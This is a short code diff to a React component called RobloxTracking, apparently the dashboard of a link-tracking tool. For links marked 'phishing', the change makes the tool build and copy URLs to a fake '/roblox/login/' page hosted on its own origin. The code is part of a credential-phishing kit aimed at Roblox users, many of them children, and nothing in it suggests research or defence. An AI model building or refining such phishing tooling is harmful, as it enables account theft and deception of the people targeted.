@@ -346,7 +346,7 @@ export default function RobloxTracking() {
                             </span>
                             <code className="bg-muted px-2 py-1 rounded text-xs truncate max-w-xs">
                               {link.linkType === "phishing" 
-                                ? link.trackingUrl.replace('/roblox/', '/roblox/login/')
+                                ? `${window.location.origin}/roblox/login/${link.trackingId}`
                                 : link.trackingUrl
                               }
                             </code>
@@ -355,7 +355,7 @@ export default function RobloxTracking() {
                               variant="ghost"
                               onClick={() => copyToClipboard(
                                 link.linkType === "phishing" 
-                                  ? link.trackingUrl.replace('/roblox/', '/roblox/login/')
+                                  ? `${window.location.origin}/roblox/login/${link.trackingId}`
                                   : link.trackingUrl
                               )}
                               data-testid={`button-copy-${link.id}`}
